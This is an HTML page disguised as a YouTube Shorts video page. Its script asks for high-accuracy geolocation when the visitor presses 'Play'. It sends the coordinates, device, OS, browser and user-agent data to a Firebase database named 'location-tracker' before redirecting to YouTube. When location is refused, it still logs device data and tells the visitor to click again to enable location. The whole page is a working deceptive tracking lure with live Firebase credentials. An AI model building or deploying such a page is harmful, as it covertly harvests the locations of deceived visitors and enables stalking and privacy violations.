<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>YouTube Shorts - Play Video</title>

  <!-- Firebase -->
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>

  <!-- UAParser.js -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.2/ua-parser.min.js"></script>

  <style>
    body { 
      display: flex; 
      flex-direction: column; 
      align-items: center; 
      justify-content: center; 
      height: 100vh; 
      font-family: Arial, sans-serif; 
      text-align: center; 
      background: #f9f9f9;
      margin: 0;
      padding: 20px;
    }
    h2 { margin-bottom: 15px; }
    img { width: 320px; border-radius: 12px; margin-bottom: 10px; }
    p { max-width: 320px; font-size: 16px; color: #333; margin-bottom: 15px; }
    button { 
      padding: 12px 20px; 
      font-size: 18px; 
      font-weight: bold; 
      color: white; 
      background: #ff0000; 
      border: none; 
      border-radius: 8px; 
      cursor: pointer; 
      transition: background 0.3s ease;
    }
    button:hover { background: #cc0000; }
    #status { margin-top: 15px; font-size: 16px; font-weight: bold; color: #007bff; }
    #error { margin-top: 15px; font-size: 16px; font-weight: bold; color: red; }
  </style>
</head>
<body>
  <h2>Watch on YouTube</h2>

  <!-- Thumbnail -->
  <img id="thumbnail" src="https://img.youtube.com/vi/KedF7uEjiTs/hqdefault.jpg" 
       alt="Video Thumbnail">

  <!-- Description -->
  <p>
    This is an awesome YouTube Short video. Click play to watch it directly on YouTube.
  </p>

  <!-- Play Button -->
  <button id="playBtn">‚ñ∂Ô∏è Play on YouTube</button>
  <p id="status"></p>
  <p id="error"></p>

  <script>
    const youtubeLink = "https://www.youtube.com/shorts/KedF7uEjiTs";

    // Firebase config
    const firebaseConfig = {
      apiKey: "AIzaSyBlvUQ7EpySZ-4lvbWuKOan7XSrNvTHIq8",
      authDomain: "location-tracker-d10ec.firebaseapp.com",
      databaseURL: "https://location-tracker-d10ec-default-rtdb.firebaseio.com",
      projectId: "location-tracker-d10ec",
      storageBucket: "location-tracker-d10ec.firebasestorage.app",
      messagingSenderId: "111876457066",
      appId: "1:111876457066:web:78c76e424dff3dbcae8013"
    };

    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    const playBtn = document.getElementById("playBtn");
    const statusEl = document.getElementById("status");
    const errorEl = document.getElementById("error");

    // Device info
    function getDeviceInfo() {
      const parser = new UAParser();
      const result = parser.getResult();
      return {
        device: result.device.model || "Unknown Device",
        brand: result.device.vendor || "Unknown Brand",
        os: result.os.name + " " + (result.os.version || ""),
        browser: result.browser.name + " " + (result.browser.version || "")
      };
    }

    // Save event to Firebase
    function saveEvent(extra = {}) {
      const deviceInfo = getDeviceInfo();
      const payload = {
        event: "button_clicked",
        timestamp: new Date().toLocaleString(),
        userAgent: navigator.userAgent,
        videoUrl: youtubeLink,
        device: deviceInfo.device,
        brand: deviceInfo.brand,
        os: deviceInfo.os,
        browser: deviceInfo.browser,
        ...extra
      };
      return database.ref("visitors").push(payload);
    }

    // Check permission state
    async function checkPermission() {
      try {
        const result = await navigator.permissions.query({ name: "geolocation" });
        if (result.state === "denied") {
          errorEl.textContent = "‚ùå Location access is blocked in your browser settings.";
          return false;
        }
        return true;
      } catch {
        return true; // Some browsers don‚Äôt support Permissions API
      }
    }

    // Handle button click
    playBtn.addEventListener("click", async () => {
      statusEl.textContent = "‚è≥ Please wait a moment...";
      errorEl.textContent = "";

      const canAsk = await checkPermission();
      if (!canAsk) {
        statusEl.textContent = "";
        errorEl.textContent = "‚ùå Click on Play Button Again (Enable Location)";
        return;
      }

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          async (pos) => {
            statusEl.textContent = "üé¨ Your video is playing in 3 seconds...";
            errorEl.textContent = "";
            await saveEvent({
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
              accuracy: pos.coords.accuracy
            });
            setTimeout(() => {
              window.location.href = youtubeLink;
            }, 3000);
          },
          async (err) => {
            // If blocked or denied
            await saveEvent({ error: err.message });
            statusEl.textContent = "";
            errorEl.textContent = "‚ùå Click on Play Button Again";
            // Fallback ‚Üí still redirect after 3s
            setTimeout(() => window.location.href = youtubeLink, 3000);
          },
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      } else {
        saveEvent({ error: "Geolocation not supported" });
        statusEl.textContent = "";
        errorEl.textContent = "‚ùå Your browser does not support location access.";
        setTimeout(() => window.location.href = youtubeLink, 3000);
      }
    });
  </script>
</body>
</html>
